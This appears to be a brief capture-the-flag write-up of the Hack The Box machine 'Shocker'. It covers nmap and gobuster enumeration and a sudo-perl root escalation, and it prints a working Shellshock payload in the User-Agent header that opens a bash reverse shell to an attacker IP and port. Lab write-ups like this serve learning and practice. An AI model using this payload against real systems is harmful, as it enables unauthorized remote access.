Shocker without metasploit:

![Shocker](https://user-images.githubusercontent.com/55708909/91436133-21961600-e885-11ea-9527-06aa2d2e852d.png)

Starting with Nmap Scan :

Nmap -sC -sV -T4 -A -O -oA Shocker -p- 10.10.10.56

![Shocker_nmap](https://user-images.githubusercontent.com/55708909/91436808-76865c00-e886-11ea-9731-23077e3b354f.png)

Nothing seems interesting at port 80 even the source code doesn't seems promising so lets use gobuster 

When i ran gobuster in two different ways i was getting two type of response:

1-Without / i was getting not found

2-With / i was getting restricted access

![Shellshock_directory](https://user-images.githubusercontent.com/55708909/91437850-25776780-e888-11ea-8280-2b7e84da1ef3.png)

When i brute force cgi-bin directory i found user.sh and when i access it. It was prompting for Download and so i downloaded it.

As soon as i get any unexpected type of prompt download options i immediately switch to burp.

For getting a reverse shell we are going to use shellshock vulnerability inside user agent 

payload: () { ignored;};/bin/bash -i >& /dev/tcp/10.10.14.6/4444/port 0>&1

Pass the request into burp and then get shell and user.txt 

For root write sudo -l

It has sudo right on perl program just grab a perl payload for reverse shell from pentest monkey and run it. Root access

![Shocker_root](https://user-images.githubusercontent.com/55708909/91654249-dcf8bd80-eac4-11ea-8dde-1ae0a5fa2870.png)








